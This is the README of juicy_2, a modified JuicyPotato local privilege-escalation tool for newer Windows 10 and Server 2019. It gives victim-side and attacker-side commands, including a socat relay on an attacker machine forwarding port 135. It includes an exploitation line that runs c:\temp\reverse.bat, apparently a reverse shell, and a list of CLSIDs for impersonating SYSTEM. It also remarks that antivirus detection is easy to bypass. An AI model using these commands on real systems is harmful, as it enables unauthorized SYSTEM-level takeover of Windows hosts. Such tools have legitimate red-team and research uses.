# juicy_2
JuicyPotato for Win10 > 1803 &amp; Win Server 2019<br>
Please read my blog post first: https://decoder.cloud/2020/05/30/the-impersonation-game/ <br>
<hr>
<b>Disclaimer:</b><br>
This is just a quick & dirty modification of our JuicyPotato in order to test valid CLSID's an to impersonate them (YOU NEED IMPERSONATION PRIVILEGES) for newer Windows 10 and Windows Server 2019 platforms.<br>
(I know, this version is catched by Defender and other AV's, but with some modifications in code it's easy to bypass)
<hr>
Mandatory requisite is to have the possibility to redirect traffic for port 135 on a forwarder machine under you control.<br>
Feel free to improve the code, I was too lazy for this kind of stuff. <br>
<hr>
<i><b>For testing CLSID:</i></b><br>
juicy_2 -z -x [ip] of socat listener  -l [fake oxid resolver port] -n [local RPC server port] -c [CLSID to test]<br>
Example:<br>
  on victim:<br>
  juicy_2 -z -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}<br>
  on attacker (192.168.1.1): <br>
  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995 
<br>
  <i><b>For exploitation:</i></b><br>
  on victim:<br>
  juicy_2 -x 192.168.1.1 -l 9995 -n 9998 -c {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} -t * -p c:\temp\reverse.bat<br>
  on attacker (192.168.1.1): <br>
  socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:<victim machine>:9995<br>
<hr>  
If you want to immperonate SYSTEM use these CLSID's:<br>
{C41B1461-3F8C-4666-B512-6DF24DE566D1}<br>
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}<br>
  
